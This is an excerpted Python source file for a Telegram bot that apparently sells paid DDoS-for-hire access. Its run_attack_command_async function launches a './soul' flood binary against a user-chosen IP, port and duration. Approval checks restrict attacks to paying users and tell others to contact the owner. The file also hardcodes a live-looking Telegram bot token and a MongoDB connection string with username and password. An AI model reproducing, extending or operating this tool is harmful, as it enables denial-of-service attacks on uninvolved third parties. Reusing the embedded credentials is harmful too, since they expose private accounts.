...
TOKEN = '7542906508:AAFmcoDan9lv13x_q71dbSe1fbTK7kId29w'
MONGO_URI = 'mongodb+srv://VirtualVenture:Ventureddos@cluster1.b02ct.mongodb.net/?retryWrites=true&w=majority&appName=Cluster1'
FORWARD_CHANNEL_ID = -1002310571870
CHANNEL_ID = -1002310571870
error_channel_id = -1002310571870

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['Harvinder']
users_collection = db.paidusers
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 20")
...
def approve_or_disapprove_user(message):
    ...
    if not is_admin:
        bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                   "*You don't have permission to use this command. DM @VirtualVenture*", parse_mode='Markdown')
        return
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @VirtualVenture.*", parse_mode='Markdown')  # Contact owner message
            return
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @VirtualVenture* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @VirtualVenture* 🙏"  # Contact owner message
    else:
